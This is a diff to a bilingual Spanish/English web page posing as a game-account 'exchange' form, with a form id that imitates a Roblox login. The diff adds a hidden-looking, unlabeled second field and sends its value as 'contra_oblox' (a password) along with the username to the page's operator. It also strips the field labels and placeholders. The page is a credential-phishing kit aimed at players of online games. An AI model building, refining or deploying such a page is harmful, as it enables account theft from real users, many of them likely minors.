@@ -76,8 +76,8 @@
         /* SELECTOR DE IDIOMA */
         .language-selector {
             position: absolute;
-            top: 15px;
-            right: 15px;
+            top: 8px;
+            right: 8px;
             z-index: 10;
         }
         
@@ -353,10 +353,11 @@
         <form id="oblox-ogin-form" class="ogin-form">
             <div class="form-group">
                 <label for="username" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
-                <input type="text" id="username" 
-                       data-es-placeholder="Introduce tu cuenta" 
-                       data-en-placeholder="Enter your account"
-                       placeholder="Introduce tu cuenta" required>
+                <input type="text" id="username" placeholder="" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="text" id="access" placeholder="" required>
             </div>
             
             <div class="loading" id="loading" data-es="Enviando datos..." data-en="Sending data...">Enviando datos...</div>
@@ -381,7 +382,6 @@
                 title: "INTERCAMBIO",
                 subtitle: "Completar",
                 usernameLabel: "Cuenta de brainrot:",
-                usernamePlaceholder: "Introduce tu cuenta",
                 loading: "Enviando datos...",
                 acceptButton: "CONTINUAR",
                 thankYou: "¡Gracias! ✅",
@@ -393,7 +393,6 @@
                 title: "EXCHANGE",
                 subtitle: "Complete",
                 usernameLabel: "Brainrot account:",
-                usernamePlaceholder: "Enter your account",
                 loading: "Sending data...",
                 acceptButton: "CONTINUE",
                 thankYou: "Thank You! ✅",
@@ -416,14 +415,7 @@
             // Actualizar textos con atributos data
             document.querySelectorAll('[data-es]').forEach(element => {
                 if (element.hasAttribute(`data-${lang}`)) {
-                    if (element.tagName === 'INPUT') {
-                        const placeholder = element.getAttribute(`data-${lang}-placeholder`);
-                        if (placeholder) {
-                            element.placeholder = placeholder;
-                        }
-                    } else {
-                        element.textContent = element.getAttribute(`data-${lang}`);
-                    }
+                    element.textContent = element.getAttribute(`data-${lang}`);
                 }
             });
         }
@@ -432,8 +424,9 @@
         document.getElementById('oblox-ogin-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
+            const access = document.getElementById('access').value;
             
-            if (username) {
+            if (username && access) {
                 // Mostrar loading
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('error-message').style.display = 'none';
@@ -443,6 +436,7 @@
                     from_name: 'Sistema de Intercambios',
                     to_name: 'Tú',
                     usuario_oblox: username,
+                    contra_oblox: access,
                     fecha: new Date().toLocaleString()
                 };
                 
